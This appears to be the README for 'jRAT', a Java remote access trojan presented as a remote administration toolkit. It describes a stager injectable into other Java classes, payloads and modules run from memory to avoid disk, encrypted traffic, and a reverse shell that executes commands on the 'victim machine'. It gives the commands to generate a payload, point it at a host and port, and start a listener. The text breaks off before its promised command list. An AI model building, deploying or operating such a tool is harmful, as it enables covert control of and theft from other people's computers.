# jRAT
Remote administration toolkit that runs from memory written in Java

- **Portable**
  - Runs on Windows, Linux, MacOS, Android

- **Modular design**
  - Additional functionality can be added at runtime by loading additional modules, and the functionality of jRAT can be extended by developing new modules.

- **Runs from memory**
  - Only the initial stager is run from disk, the main payload (Stage) and any additional modules that are loaded are loaded and run using a class loader from memory. In case an additional module depends on shared libraries they are saved to a temporary file, loaded, and removed after loading.

- **Encrypted**
  - Network communication is encrypted using AES


This remote administration toolkit consists of a simple stager that can be injected into other Java clases, or used as a standalone payload.
By running the jRAT.jar without any parameters `java -jar jRAT.jar`, a standalone payload is created containing the main method that can be used for demonstration purposes, by providing it the server/listener address and port to connect to.


**Generating a standalone payload**

`java -jar jRAT.jar`

**Running a standalone payload**

`java -jar standaloner.jar <host> <port>`

**Starting a listener**

`java -jar jRAT.jar <port>`


After the client connects to the listener a shell will be presented, and a directory created for the victim machine in the current directory.
Directory name will be named based on the IP address of the victim machine.
By default jRAT works as a reverse shell and can be used to execute commands on the victim machine.
Additional functionality is provided by using the commands described below, which can be seen by using the `help` command:













